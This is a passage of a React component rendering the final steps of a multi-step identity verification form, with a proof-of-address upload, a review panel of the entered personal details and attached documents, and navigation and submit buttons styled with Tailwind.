              <input type="file" accept="image/*,application/pdf" onChange={(e) => setProofOfAddressFile(e.target.files?.[0] || null)} className="w-full bg-zinc-950/50 border border-zinc-800 rounded-2xl px-4 py-3 text-sm text-zinc-400 file:ml-4 rtl:file:mr-4 file:py-2.5 file:px-6 file:rounded-xl file:border-0 file:text-sm file:font-bold file:bg-emerald-500 file:text-black cursor-pointer" />
              <p className="text-[11px] text-zinc-500">{t.addrDesc}</p>
            </div>
          </div>
        )}

        {/* STEP 4 */}
        {step === 4 && (
          <div className="space-y-6">
            <div className="p-6 bg-zinc-950 border border-zinc-800 rounded-2xl space-y-5">
              <h3 className="text-white font-bold border-b border-zinc-800 pb-3 flex items-center">
                <CheckSquare className="w-5 h-5 ml-2 rtl:mr-2 text-emerald-400" /> {t.reviewTitle}
              </h3>
              
              <div className="grid grid-cols-2 gap-y-4 gap-x-6 text-sm">
                <div>
                  <span className="block text-zinc-500 text-[11px] uppercase tracking-wider mb-1">{t.fullName}</span>
                  <span className="text-zinc-200 font-bold">{firstName} {lastName}</span>
                </div>
                <div>
                  <span className="block text-zinc-500 text-[11px] uppercase tracking-wider mb-1">{t.dob}</span>
                  <span className="text-zinc-200 font-bold">{dateOfBirth}</span>
                </div>
                <div className="col-span-2">
                  <span className="block text-zinc-500 text-[11px] uppercase tracking-wider mb-1">{t.email}</span>
                  <span className="text-zinc-200 font-bold">{email}</span>
                </div>
                <div className="col-span-2 bg-emerald-500/5 p-3 rounded-lg border border-emerald-500/10">
                  <span className="block text-emerald-500/70 text-[11px] uppercase tracking-wider mb-1">{t.whatsappNum}</span>
                  <span className="text-emerald-400 font-black text-lg tracking-wider" dir="ltr">{whatsappNumber}</span>
                </div>
                <div className="col-span-2 pt-2 border-t border-zinc-800">
                  <span className="block text-zinc-500 text-[11px] uppercase tracking-wider mb-2">{t.attachedDocs}</span>
                  <div className="flex items-center space-x-2 space-x-reverse text-zinc-300">
                    <CheckCircle className="w-4 h-4 text-emerald-500" />
                    <span className="text-xs font-semibold">{idCardFile?.name}</span>
                  </div>
                  <div className="flex items-center space-x-2 space-x-reverse text-zinc-300 mt-2">
                    <CheckCircle className="w-4 h-4 text-emerald-500" />
                    <span className="text-xs font-semibold">{proofOfAddressFile?.name}</span>
                  </div>
                </div>
              </div>
            </div>

            <p className="text-xs text-zinc-400 text-center px-4 leading-relaxed">
              {t.agreeText}
            </p>
          </div>
        )}

        {/* CONTROLS */}
        <div className="flex items-center justify-between pt-6 border-t border-zinc-800">
          
          <button
            type="button"
            onClick={handlePrevStep}
            disabled={step === 1 || loading}
            className={`flex items-center space-x-2 space-x-reverse px-6 py-3 rounded-xl font-bold transition-all ${
              step === 1 ? "opacity-0 pointer-events-none" : "bg-zinc-800 text-white hover:bg-zinc-700"
            }`}
          >
            {t.dir === 'rtl' ? <ChevronRight className="w-5 h-5" /> : <ChevronLeft className="w-5 h-5" />}
            <span>{t.back}</span>
          </button>

          {step < 4 ? (
            <button
              type="button"
              onClick={handleNextStep}
              className="flex items-center space-x-2 space-x-reverse bg-emerald-500 text-black px-8 py-3 rounded-xl font-extrabold hover:bg-emerald-400 transition-all shadow-[0_0_20px_rgba(16,185,129,0.3)]"
            >
              <span>{t.next}</span>
              {t.dir === 'rtl' ? <ChevronLeft className="w-5 h-5" /> : <ChevronRight className="w-5 h-5" />}
            </button>
          ) : (
            <button
              type="submit"
              disabled={loading}
              className="flex items-center space-x-2 space-x-reverse bg-gradient-to-r from-emerald-500 to-cyan-500 text-black px-8 py-3 rounded-xl font-extrabold hover:opacity-90 transition-all shadow-[0_0_30px_rgba(16,185,129,0.4)] disabled:opacity-50"
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>{t.processing}</span>
                </>
              ) : (
                <>
                  <span>{t.submit}</span>
                  <Send className="w-5 h-5" />
                </>
              )}
            </button>
          )}

        </div>
      </form>
    </div>
  );
}